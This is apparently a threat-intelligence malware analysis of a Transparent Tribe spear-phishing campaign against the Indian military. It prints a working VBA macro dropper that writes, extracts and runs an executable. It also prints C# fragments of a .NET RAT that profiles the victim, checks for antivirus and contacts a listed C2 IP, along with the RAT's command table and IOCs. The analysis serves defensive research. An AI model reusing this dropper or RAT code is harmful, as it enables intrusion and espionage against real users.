# Not as so transparent
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Threat Intelligence](#Intel)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [Yara Rules](#Yara)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [Ressources](#Ressources)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector is from a decoy document probably shared from a spear-phishing (a copy of the content can be viewed <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Pakistan/APT/Transparent%20Tribe/22-01-20/Content_Decoy.txt">here</a>), this document have two links for download additionals informations. The both maldoc , this uses a macro for extract and executes the PE file depends on the version of the operating system.</h6>

```vb
Sub unMoferzip(Fname As Variant, FileNameFolder As Variant)
 Dim FSO As Object
 Dim oApp As Object
 'Extract the files into the Destination folder
 Set oApp = CreateObject("Shell.Application")
 oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items, &H4
End Sub

Sub MoferfileLdr()
 Dim path_Mofer_file As String
 Dim file_Mofer_name  As String
 Dim zip_Mofer_file  As Variant
 Dim fldr_Mofer_name  As Variant
 file_Mofer_name = "ulhtagnias"
 fldr_Mofer_name = Environ$("ALLUSERSPROFILE") & "\DeIA-WIR\"
 If Dir(fldr_Mofer_name, vbDirectory) = "" Then
  MkDir (fldr_Mofer_name)
 End If
 zip_Mofer_file = fldr_Mofer_name & file_Mofer_name & ".zip"
 path_Mofer_file = fldr_Mofer_name & file_Mofer_name & ".exe"
 Dim ar1Mofer() As String
 Dim btsMofer() As Byte
 If InStr(Application.System.Version, "6.2") > 0 Or InStr(Application.System.Version, "6.3") > 0 Then
  ar1Mofer = Split(UserForm1.TextBox2.Text, "'")
 Else
  ar1Mofer = Split(UserForm1.TextBox1.Text, "'")
 End If
 Dim linMofer As Double
 linMofer = 0
 For Each vl In ar1Mofer
  ReDim Preserve btsMofer(linMofer)
  btsMofer(linMofer) = CByte(vl)
  linMofer = linMofer + 1
 Next
  Open zip_Mofer_file For Binary Access Write As #2
   Put #2, , btsMofer
 Close #2
 If Len(Dir(path_Mofer_file)) = 0 Then
  Call unMoferzip(zip_Mofer_file, fldr_Mofer_name)
 End If
   Shell path_Mofer_file, vbNormalNoFocus
End Sub
```

<h6>The .NET implant begins to load the recon actions, push a timer for sleep the process and try to join the C2. </h6>

```csharp
public void ulhtagniasdo_start()
{
 ulhtagniasCONF.ulhtagniasport = ulhtagniasCONF.ports[0];
 this.ulhtagniasrunTime = DateTime.Now;
 this.ulhtagniasUPC = new ulhtagniasMYINF();
 this.ulhtagniasCMD = new ulhtagniasOCMD(this);
 this.ulhtagniasHD.iserver = this;
 this.ulhtagniasHD.ulhtagniasmainPath = ulhtagniasCONF.ulhtagniasget_mpath();
 TimerCallback callback = new TimerCallback(this.ulhtagniaslookup_connect);
 System.Threading.Timer ulhtagniastimer = new System.Threading.Timer(callback, this.ulhtagniasStateObj, 32110, 36110);
 this.ulhtagniasStateObj.ulhtagniastimer = ulhtagniastimer;
}
```

<h6>Once the connexion is establish with the C2, this sends the informations of the user, system, sensible AV (who detect it easily) and this repertory (here from a trace of the TCP stream of an Anyrun sandbox)</h6>

``` .....info=command.....ulhtagnias-info=user8....|USER-PC|admin||6>1|S.P.1.3|| ||C:\ProgramData\DeIA-WIR\.....clping=Ping.....clping=Ping```

```csharp
private void ulhtagniasuser_info()
{
 string text = string.Concat(new string[]
 {
  this.ulhtagniasUPC.ulhtagniaslancard,"|",this.ulhtagniasUPC.ulhtagniascname,"|",
  this.ulhtagniasUPC.ulhtagniasuname,"|",this.ulhtagniasUPC.ulhtagniasuip,"|",
  ulhtagniasCONF.ulhtagniasOsname(),"|",this.ulhtagniasUPC.ulhtagniasapver,"|",
  ulhtagniasCONF.ulhtagniasloadAV()
 });
 text += "| !ulhtagnias".Split(new char[]{'!'})[0];
 text = text + "|" + this.ulhtagniasUPC.ulhtagniasclientNum;
 text = text + "|" + ulhtagniasCONF.ulhtagniasget_mpath();
 byte[] byteArray = ulhtagniasCONF.getByteArray(text);
 this.ulhtagniaspush_data(byteArray, "ulhtagnias-info=user|ulhtagnias".Split(new char[]{'|'})[0], false);
} 

public static string ulhtagniasOsname()
{
 string result;
 try
 {
  OperatingSystem osversion = Environment.OSVersion;
  result = osversion.Version.Major.ToString() + ">" + osversion.Version.Minor.ToString();
 }
 catch {result = "6>1!ulhtagnias".Split(new char[]{'!'})[0];}
 return result;
}
```

<h6>The name of PE file is used as identifier and the command by a couple {nameimplant-command}.This can perform the actions by the following commands :</h6>

<p align="center">
<table>
  <tr>
    <th>Command</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>-procl</td>
    <td>Get the list of process</td>
  </tr>
  <tr>
    <td>-thumb</td>
    <td>Get info of a picture</td>
  </tr>
  <tr>
    <td>-clping</td>
    <td>Check activity</td>
  </tr>  
  <tr>
    <td>-putsrt</td>
    <td>Push the persistence in a Run key </td>
  </tr>  
  <tr>
    <td>-filsz</td>
    <td>Get infos of a specific file</td>
  </tr>
  <tr>
    <td>-rupth</td>
    <td>Push the data received</td>
  </tr>
  <tr>
    <td>-dowf</td>
    <td>Save to a file the data pushed on the system</td>
  </tr>
  <tr>
    <td>-endpo</td>
    <td>Kill a process</td>
  </tr>
  <tr>
    <td>-scrsz</td>
    <td>Get the size of the screen</td>
  </tr>
  <tr>
    <td>-cownar</td>
    <td>Download and run a executable file</td>
  </tr>
  <tr>
    <td>-cscreen</td>
    <td>Get a screenshot</td>
  </tr>
  <tr>
    <td>-dirs</td>
    <td>List all the drives and directories</td>
  </tr>
  <tr>
    <td>-stops</td>
    <td>stop the mod for get periodical screenshot</td>
  </tr>
  <tr>
    <td>-scren</td>
    <td>start the mod for get periodical screenshot</td>
  </tr>
  <tr>
    <td>-cnls</td>
    <td>Allow index, send data and disable continue screenshot </td>
  </tr>
  <tr>
    <td>-udlt</td>
    <td>Download and execute an executable for remove an user ? </td>
  </tr>
  <tr>
    <td>-delt</td>
    <td>Delete a specific file</td>
  </tr>
  <tr>
    <td>-listf</td>
    <td>List files</td>
  </tr>
  <tr>
    <td>-file</td>
    <td>Get a specific file</td>
  </tr>
  <tr>
    <td>-info</td>
    <td>Get user and system infos, check if the AV is on blacklist</td>
  </tr>
  <tr>
    <td>-runf</td>
    <td>Execute a specific file</td>
  </tr>
  <tr>
    <td>-dowr</td>
    <td>Download a file on the system</td>
  </tr>
  <tr>
    <td>-fldr</td>
    <td>Get folders and go silent mod</td>
  </tr>
</table> 
</p>

<h6>On the RAT, one of two byte array is used for triggering the detection of a sensible AV.</h6>

```csharp
public static byte[] encAvs = new byte[]{98,100,115,115,61,66,105,116,32,68,101,102,101,110,100,101,114,44,111,110,108,105,110,101,110,116,61,81,46,72,101,97,108,44,98,100,97,103,101,110,116,61,66,105,116,32,68,101,102,101,110,100,101,114,32,65,103,101,110,116,44,109,115,115,101,99,101,115,61,77,83,32,69,115,115,101,110,116,105,97,108,115,44,102,115,115,109,51,50,61,70,83,101,99,117,114,101,44,97,118,112,61,75,97,115,112,101,114,115,107,121,44,97,118,103,110,116,61,65,118,105,114,97,44,115,112,98,98,99,115,118,99,61,83,121,109,97,110,116,101,99,44,117,112,100,97,116,101,114,117,105,61,77,99,65,102,101,101,44,97,118,103,117,105,61,65,86,71,44,97,118,103,99,99,61,65,86,71,44,109,98,97,109,61,65,110,116,32,77,97,108,119,97,114,101,44,97,118,97,115,116,117,105,61,65,118,97,115,116,44,97,118,97,115,116,61,65,118,97,115,116};
```
<h6>This can be easily viewable in an oneliner (UTF8 + Getstring) and show the list of sensible AV to detect.</h6>
  
```csharp
PS> ([System.Text.Encoding]::UTF8.GetString($encAvs)).split(",")
bdss=Bit Defender
onlinent=Q.Heal
bdagent=Bit Defender Agent
msseces=MS Essentials     
fssm32=FSecure
avp=Kaspersky
avgnt=Avira
spbbcsvc=Symantec
updaterui=McAfee
avgui=AVG
avgcc=AVG
mbam=Ant Malware
avastui=Avast
avast=Avast 
 ```
  
<h6>With the same logic, we can get the content of the second array which get the IP of the C2 to contact.</h6>

```csharp
PS> ([System.Text.Encoding]::UTF8.GetString($tab)).split(",")   
198.46.177.73
```

<h6>Some identifiers like the name of user, default IP and logname can be found.</h6>

```csharp
public static string ulhtagniasmainApp = "ulhtagnias|ulhtagnias".Split(new char[]{'|'})[0];
public static string ulhtagniaspc_id = "vhldsp|ulhtagnias".Split(new char[]{'|'})[0];
public static string ulhtagniasremvUser = "drlarmn|ulhtagnias".Split(new char[]{'|'})[0];
public static string ulhtagniasfilesLogs = "rndlbes".Split(new char[]{'|'})[0];}
public static string ulhtagniasdefaultP = "122.200.110.101|ulhtagnias".Split(new char[]{'|'})[0];
```
<h6>This connects on the default port (6421) and can switch depending on the needs of the operations.</h6>

```csharp
public static int[] ports = new int[]{6421,4920,10422,14823,16824};
public void ulhtagniasports_switch()
 {
  try
  {
   this.port_sn++;
   ulhtagniasCONF.ulhtagniasport = ulhtagniasCONF.ports[this.port_sn];
   if (this.port_sn >= ulhtagniasCONF.ports.Length - 1){this.port_sn = 0;}
  }
 catch{this.port_sn = 0;}
 }
```
<h5>Addionnal informations :</h5>
<ul>
  <li>ulhtagnias.exe</li>
  <p align="center">
<table>
  <tr>
    <td>pdb path</td>
    <td>g:\ulhtagnias\ulhtagnias\obj\Debug\ulhtagnias.pdb</td>
  </tr>
  <tr>
    <td>Compilation time</td>
    <td>2020-01-09 21:21:34</td>
  </tr>
</table>
</p>
  <li>Special Benefits.docx</li>
  <p align="center">
<table>
  <tr>
    <td>Creator</td>
    <td>Dell-R</td>
  </tr>
   <tr>
    <td>Last Modified By</td>
    <td>Bipin</td>
  </tr>
    <tr>
    <td>Creation date</td>
    <td>2020-01-15 10:02:00</td>
  </tr>
    <tr>
    <td>Last Modified Date</td>
    <td>2020-01-17 04:41:00</td>
  </tr>
  <tr>
    <td>Software used</td>
    <td>Microsoft Office Word 12.0 (2007)</td>
  </tr>
</table>
</p>
  <li>Criteria of Army Officers.doc</li>
   <p align="center">
<table>
  <tr>
    <td>Creator</td>
    <td>Bipin</td>
  </tr>
   <tr>
    <td>Last Modified By</td>
    <td>Bipin</td>
  </tr>
    <tr>
    <td>Creation date</td>
    <td>2020-01-12 07:14:43</td>
  </tr>
    <tr>
    <td>Last Modified Date</td>
    <td>2020-01-12 07:14:43</td>
  </tr>
  <tr>
    <td>Software used</td>
    <td>Microsoft Office Word 12.0 (2007)</td>
  </tr>
</table>
</p>
  <li>7All Selected list.xls</li>
   <p align="center">
<table>
  <tr>
    <td>Creator</td>
    <td></td>
  </tr>
   <tr>
    <td>Last Modified By</td>
    <td></td>
  </tr>
    <tr>
    <td>Creation date</td>
    <td>2020-01-12 07:04:53</td>
  </tr>
    <tr>
    <td>Last Modified Date</td>
    <td>2020-01-12 07:08:59</td>
  </tr>
  <tr>
    <td>Software used</td>
    <td>Microsoft Office Word 12.0 (2007)</td>
  </tr>
</table>
</p>
</ul> 
<h5>Several interesting things are to be reported. Firstly, the NET implant was designed first for the event, secondly, the maldoc are planned before the idea of the decoy document to download them. The Bipin account often comes up in Transparent Tribe campaigns, possibly it is responsible for the development of malicious tools, in this logic the other "Dell-R" account would be responsible for the templates of the decoys.The fact that the document is delivered after the celebration is not a problem in the logic that it should be given as a reward after the event, so the team could hang longer than if it would have an announcement related only to the day of the event.</h5>


<h2>Threat Intelligence</h2><a name="Intel"></a></h2>
<h6>This operation uses the recent event of the 72nd year of the independence of the Indian armed forces. The Transparent Tribe group specializes in its field of attack in the Indian armed forces. </h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Pakistan/APT/Transparent%20Tribe/22-01-20/picture/lure.png">
</p>
<h6>The main purpose of this operation isn't to obtain more information from arms tests since the lasts month by the various Indian armed groups but, first of all, to collect identities and credentials to conduct more extensive operations.</h6>
<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>This process graph represent the cyber kill chain of the maldoc vector.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Pakistan/APT/Transparent%20Tribe/22-01-20/picture/cyber.png">
</p>
<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> List of all the Indicators Of Compromise (IOC)</h6>

|Indicator|Description|
| ------------- |:-------------:|
|Special Benefits.docx|6c9c6966ce269bbcab164aca3c3f0231af1f7b26a18e5abc927b2ccdd9499368|
|Criteria of Army Officers.doc|1cb726eab6f36af73e6b0ed97223d8f063f8209d2c25bed39f010b4043b2b8a1|
|7All Selected list.xls|2aa160726037e80384672e89968ab4d2bd3b7f5ca3dfa1b9c1ecc4d1647a63f0|
|ulhtagnias.exe|d2c46e066ff7802cecfcb7cf3bab16e63827c326b051dc61452b896a673a6e67|
|198.46.177.73|IP C2|

<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Pakistan/APT/Transparent%20Tribe/22-01-20/json/ioc.json">JSON</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Discovery|Query Registry|https://attack.mitre.org/techniques/T1012/|
|C&C|Uncommonly Used Port|https://attack.mitre.org/techniques/T1065/|
|Defense Evasion|Scripting|https://attack.mitre.org/techniques/T1064/|
|Execution|Scripting|https://attack.mitre.org/techniques/T1064/|

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Pakistan/APT/Transparent%20Tribe/22-01-20/json/Mitre-APT36-22-01-20.json">Export in JSON</a></h6>
<h2>Yara Rules<a name="Yara"></a></h2>
<h6> A list of YARA Rule is available <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Pakistan/APT/Transparent%20Tribe/22-01-20/yara/YARA_Rule_APT36_Jan_2020.yar">here</a></h6>
<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>

* [https://twitter.com/Arkbird_SOLG/status/1219769450989334528](https://twitter.com/Arkbird_SOLG/status/1219769450989334528) 

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [Special Benefits.docx](https://app.any.run/tasks/37407c30-de54-423f-a468-5981c50ced6f)
* [7All Selected list.xls](https://app.any.run/tasks/db365b0c-883e-410c-975d-d14753a5bfb4)
* [Criteria of Army Officers.doc](https://app.any.run/tasks/de93d3a4-9ff0-4bed-b492-1f45214a0443)

<h6> Resources : </h6><a name="Ressources"></a>

* [Operation Transparent Tribe - APT Targeting Indian Diplomatic and Military Interests](https://www.proofpoint.com/us/threat-insight/post/Operation-Transparent-Tribe)
